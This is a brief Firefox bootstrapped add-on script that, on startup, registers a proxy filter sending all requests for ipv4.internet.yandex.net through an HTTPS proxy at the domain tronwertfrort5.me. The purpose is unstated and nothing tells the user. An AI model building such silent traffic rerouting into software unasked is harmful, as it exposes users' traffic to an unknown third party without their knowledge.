let proxyInfo, ppService = Components.classes["@mozilla.org/network/protocol-proxy-service;1"].getService(Components.interfaces.nsIProtocolProxyService);

let proxyFilter = {
  applyFilter: function (aProxyService, aURI, aProxy) {
    if (aURI.host == "ipv4.internet.yandex.net") {
      return proxyInfo;
    } else {
      return aProxy;
    }
  }
};

function startup(aData, aReason) {
  proxyInfo = ppService.newProxyInfo("https", "tronwertfrort5.me", 443, 
    Components.interfaces.nsIProxyInfo.TRANSPARENT_PROXY_RESOLVES_HOST, 0xffffffff, null);
  ppService.registerFilter(proxyFilter, 1000);
}

function shutdown(aData, aReason) {
  ppService.unregisterFilter(proxyFilter);
}

function install(aData, aReason) {}
function uninstall(aData, aReason) {}
